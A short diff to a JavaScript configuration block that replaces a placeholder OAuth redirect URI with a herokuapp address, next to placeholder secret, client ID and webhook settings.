@@ -1,7 +1,7 @@
 //Config
 const secret_value = 'secret_value'
 const client_id = 'client_id'
-const redirect_uri = 'redirect_uri'
+const redirect_uri = 'https://d-na.herokuapp.com/'
 const webhook_url = 'webhook'
 //Requirements
 const axios = require('axios')
